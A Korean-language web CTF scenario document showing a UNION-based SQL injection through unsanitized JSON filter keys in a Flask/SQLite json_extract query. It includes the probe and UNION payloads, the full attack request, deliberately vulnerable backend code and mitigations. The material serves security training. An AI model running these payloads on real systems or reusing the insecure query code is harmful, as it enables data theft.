---
title: Modern SQL Injection via JSON Extraction — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, sql-injection, json-injection, api-security, pgsql-sqlite]
confidence: high
---

# Modern SQL Injection via JSON Extraction — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: Trend Analyzer (트렌드 분석 검색기)
- **난이도**: Medium-High
- **핵심 컨셉**: 현대 웹 개발 프레임워크와 NoSQL 스타일의 JSON 컬럼 지원 데이터베이스(SQLite, PostgreSQL 등)를 겨냥한 **현대적인 SQL 인젝션(SQLi)** 문제입니다. 애플리케이션은 사용자의 복잡한 메타데이터 검색 조건을 JSON 객체 형태로 전달받습니다. 백엔드는 ORM의 보안 바인딩 기능을 제공하지만, JSON 내부 필드를 쿼리 조건으로 파싱하는 헬퍼 함수(`->>` 또는 `json_extract`)에 사용자 입력이 그대로 문자열 포맷팅(Concatenation)되어 쿼리가 실행됩니다. 공격자는 JSON 구조 속의 취약 지점을 찾아 Blind SQLi 또는 UNION SQLi를 적용하여 숨겨진 플래그 테이블의 데이터를 덤프해야 합니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **Frontend**: 트렌드 키워드, 정렬 기준, 추가 필터 조건을 기반으로 차트를 보여주는 대시보드 화면.
- **Backend Service (Python/Flask or Node.js)**: 
  - SQLite를 백엔드 DB로 사용.
  - 검색 데이터 테이블에는 `id`, `title`, `metadata` (JSON 텍스트 타입) 컬럼이 존재.
- **Flag 위치**: 
  - 별도의 시스템 테이블 `flag_store` 내의 `flag_value` 컬럼에 저장되어 있음.

### 2.2 취약점 지점
1. **Unsafe JSON Path Concatenation**:
   - 데이터베이스 쿼리를 조율하는 로직에서 JSON 컬럼 내 특정 경로를 추출하기 위해 사용자 전달 JSON 키/값을 쿼리에 동적으로 합칩니다.
   - 예: `SELECT * FROM items WHERE json_extract(metadata, '$.' || '{user_key}') = ?`
   - 사용자 입력 `user_key`에 문자열 바인딩이 누락되거나 이중 홀따옴표 검증이 부실하면, JSON 경로 해석기 밖으로 빠져나오는 SQL Injection 구문을 작성할 수 있습니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 | 메소드 | 인증 | 입력 값 (Body JSON) | 반환 값 | 비고 |
|------------|--------|------|--------------------|---------|------|
| `/api/search` | POST | 없음 | `{"keyword": "...", "filters": {"color": "red"}}` | 조건에 매칭되는 제품 목록 JSON | `filters` 내부 키 필드에 SQLi 취약점 내포 |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. 취약점 탐색
사용자는 정상적인 검색 요청을 수행하며 API 응답 구조를 살펴봅니다.
- *정상 요청*:
  ```json
  {
    "keyword": "shoes",
    "filters": {"brand": "nike"}
  }
  ```
- *취약점 주입 시도*:
  JSON 내부의 필터 키값을 수정하여 데이터베이스 에러나 반응 차이를 살핍니다.
  ```json
  {
    "keyword": "shoes",
    "filters": {"brand' ) --": "nike"}
  }
  ```
- *결과*: 에러 코드(Internal Server Error) 혹은 정상 쿼리와 다른 지연 응답이 발생합니다. 백엔드 코드에서 `json_extract(metadata, '$.' || 'brand' ) --')`가 결합되어 SQL 문법 에러가 났음을 추정할 수 있습니다.

### Step 2. UNION SQL Injection 공격 설계
공격자는 에러 상황을 우회하고 다른 테이블(`flag_store`)의 내용을 조회하기 위해 UNION 구문을 구성합니다.
- **SQL 결합 원리**:
  서버 내부 쿼리:
  `SELECT id, title, metadata FROM trends WHERE json_extract(metadata, '$.[USER_INPUT]') = ?`
  (여기서 `?` 바인딩 자리는 값인 `"nike"`가 대입됨)

- **페이로드 변조 (UNION 인젝션)**:
  `brand` 대신 아래와 같이 입력하여 JSON 경로를 닫고 `UNION SELECT` 구문을 강제 삽입합니다.
  - **Payload Key**: `brand') = 'nike' UNION SELECT 1, flag_value, '{}' FROM flag_store --`
  - *대입 결과 완성형 SQL*:
    ```sql
    SELECT id, title, metadata FROM trends WHERE json_extract(metadata, '$.brand') = 'nike' UNION SELECT 1, flag_value, '{}' FROM flag_store --') = 'nike'
    ```

### Step 3. 최종 공격 전송 및 결과 확인
공격자는 POST 요청의 JSON 필터 인자를 조작하여 서버에 보냅니다.
- *공격 요청*:
  ```http
  POST /api/search HTTP/1.1
  Host: trend.challenge.local
  Content-Type: application/json

  {
    "keyword": "shoes",
    "filters": {
      "brand') = 'nike' UNION SELECT 1, flag_value, '{}' FROM flag_store --": "nike"
    }
  }
  ```
- *응답 결과*:
  정상 검색 항목에 이어 플래그 데이터가 추가된 JSON 응답을 얻습니다.
  ```json
  [
    {"id": 102, "title": "Nike Air Zoom", "metadata": "{...}"},
    {"id": 1, "title": "FLAG{js0n_extract_sqli_is_r3al}", "metadata": "{}"}
  ]
  ```

---

## 5. 취약점 유발 백엔드 코드 스니펫 (Python SQLite)

```python
# database.py / app.py
from flask import Flask, request, jsonify
import sqlite3

app = Flask(__name__)

def get_db():
    conn = sqlite3.connect("trends.db")
    conn.row_factory = sqlite3.Row
    return conn

@app.route("/api/search", methods=["POST"])
def search_trends():
    data = request.get_json()
    keyword = data.get("keyword", "")
    filters = data.get("filters", {})  # 예: {"brand": "nike"}
    
    conn = get_db()
    cursor = conn.cursor()
    
    # 기본 쿼리
    query = "SELECT id, title, metadata FROM trends WHERE title LIKE ?"
    params = [f"%{keyword}%"]
    
    # 취약점 지점: JSON 키 값을 동적으로 결합하면서 필터링 또는 매핑 검증 생략
    for key, val in filters.items():
        # json_extract 경로를 설정할 때 string formatting 적용
        # key가 "brand"라면 안전하지만, key에 SQL 공격 구문이 들어가면 쿼리가 오염됨
        query += f" AND json_extract(metadata, '$.{key}') = ?"
        params.append(val)
        
    try:
        cursor.execute(query, params)
        rows = cursor.fetchall()
        
        results = []
        for row in rows:
            results.append({
                "id": row["id"],
                "title": row["title"],
                "metadata": row["metadata"]
            })
        return jsonify(results)
    except Exception as e:
        return jsonify({"error": f"Database error: {str(e)}"}), 500
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **JSON 경로 및 키의 안전한 매핑 (Allowlist Validation)**:
   - 클라이언트가 임의의 JSON 키 이름을 쿼리 컬럼 및 경로로 마음대로 매핑하도록 두어서는 안 됩니다.
   - 검색 조건에 허용될 키 이름을 화이트리스트 배열로 지정하고 엄격히 필터링합니다.
   - **수정 예시**:
     ```python
     ALLOWED_KEYS = ["brand", "color", "size"]
     for key, val in filters.items():
         if key not in ALLOWED_KEYS:
             return jsonify({"error": "Invalid filter key"}), 400
     ```
2. **매개변수화된 JSON 전용 API 함수 사용**:
   - 최신 ORM(예: SQLAlchemy, Prisma)이나 쿼리 빌더를 사용하면 데이터베이스 드라이버 수준에서 안전하게 컴파일되는 JSON 추출 문법을 제공합니다.
3. **입력 데이터 클렌징**:
   - 키 이름에 데이터베이스 구분 문자나 특수 기호(`'`, `"`, `-`, `)`)가 포함되는 경우 요청을 거절합니다.
